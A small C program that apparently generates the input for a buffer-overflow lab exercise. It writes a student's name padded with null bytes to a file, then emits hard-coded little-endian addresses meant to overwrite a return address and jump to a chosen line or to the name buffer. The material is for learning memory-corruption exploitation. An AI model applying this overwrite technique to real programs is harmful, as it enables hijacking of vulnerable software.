#include <stdio.h>
int main(){
        int i;
        FILE* fp;
        fp=fopen("data6", "w");
        if(!fp) return -1;
        fputs("Stylianos Sfakianakis", fp); /* 21 chars */
        for(i = 0; i < 13; i++)   /* 21+13=34 */
                fputc('\0',fp);
        fputc(50,fp);

        putchar(0x8e);
        putchar(0x9e);
        putchar(0x04);/*andress of line 38 (print 6)*/
        putchar(0x08);
        putchar(0xdc);
        putchar(0x42);
        putchar(0x0e);/*andress of name*/
        putchar(0x08);
        return 0;
}
